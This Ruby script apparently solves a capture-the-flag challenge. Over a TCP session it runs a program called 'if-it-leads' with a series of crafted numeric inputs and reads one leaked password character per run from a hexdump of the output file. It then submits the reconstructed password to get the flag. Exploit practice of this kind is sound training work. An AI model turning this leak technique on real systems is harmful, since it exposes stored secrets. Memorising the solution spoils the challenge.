# encoding: ASCII-8bit

require 'socket'
require 'timeout'
require_relative './libronsolve'

# Data files
host, port = get_host_port()
s = TCPSocket.new(host, port)

def wait_for(s, str)
  a = ''
  loop do
    a += s.readpartial(65_500)
    if a.include?(str)
      return a
    end
  end
end

# Wait for the server to be ready
puts wait_for(s, 'ctf@')

def to_int32(n)
  n &= 0xFFFF_FFFF       # keep low 32 bits
  n >= 0x8000_0000 ? n - 0x1_0000_0000 : n
end

nums = [
  11111,
  111111,
  1111111,
  11111111,
  111111111,
  1111111111,
  -1111111111,
]

password = nums.map do |n|
  s.puts('rm -f test.out')
  s.puts('./if-it-leads')
  wait_for(s, '->')
  s.puts('aaaa') # password
  s.puts('title')
  s.puts('artist')
  s.puts('album')
  s.puts(n)
  s.puts('comment')
  s.puts('test.out') # filename
  wait_for(s, '~$')
  s.puts('hexdump -C test.out')
  hexdump = wait_for(s, '~$')
  if hexdump =~ /^00000080.*([A-Z0-9_.!-])\|/i
    puts "Got a letter: #{ Regexp.last_match(1) }"
    Regexp.last_match(1)
  else
    puts "ERROR! Didn't get a letter!"
    puts hexdump
    exit(1)
  end
end.join

puts "Full password: #{ password }"

s.puts('./if-it-leads')
wait_for(s, '->')
s.puts(password) # password

sleep(2)
check_flag(s.readpartial(65_500), terminate: true)
